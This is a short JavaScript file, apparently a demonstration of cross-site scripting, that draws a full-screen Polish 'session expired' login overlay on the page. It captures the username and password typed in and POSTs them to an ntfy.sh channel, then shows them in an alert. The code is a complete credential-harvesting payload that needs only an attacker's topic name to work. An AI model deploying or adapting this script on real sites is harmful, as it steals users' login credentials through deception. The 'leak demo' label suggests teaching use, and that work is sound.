// Fake login loaded by the XSS payload. Sends the entered data to ntfy (leak demo).
const o = document.createElement('div');
o.style.cssText = 'position:fixed;inset:0;background:rgba(2,6,23,.75);backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;z-index:999999;font-family:system-ui,sans-serif';
o.innerHTML = "<div style='background:#0f172b;border:1px solid #1d293d;padding:28px 32px;border-radius:16px;width:340px;box-sizing:border-box;box-shadow:0 10px 40px rgba(0,0,0,.6);text-align:center;color:#f1f5f9'><h2 style='margin:0 0 6px;font-size:20px;font-weight:700'>Sesja wygasła</h2><p style='margin:0 0 18px;font-size:13px;color:#90a1b9'>Zaloguj się ponownie, aby kontynuować.</p><input id='xu' placeholder='Login' style='width:100%;box-sizing:border-box;margin-bottom:10px;padding:10px 14px;border:1px solid #314158;border-radius:12px;background:#020617;color:#f1f5f9'><input id='xp' type='password' placeholder='Hasło' style='width:100%;box-sizing:border-box;margin-bottom:16px;padding:10px 14px;border:1px solid #314158;border-radius:12px;background:#020617;color:#f1f5f9'><button id='xb' style='width:100%;padding:10px;border:0;border-radius:12px;background:#4f39f6;color:#fff;font-weight:600;cursor:pointer'>Zaloguj</button></div>";
document.body.appendChild(o);
document.getElementById('xb').onclick = function () {
  const l = document.getElementById('xu').value;
  const p = document.getElementById('xp').value;
  fetch('https://ntfy.sh/', { method: 'POST', body: 'Login: ' + l + '\nHaslo: ' + p }); // wpisz swój temat ntfy po ukośniku
  alert('Przechwycono:\nLogin: ' + l + '\nHasło: ' + p);
  o.remove();
};
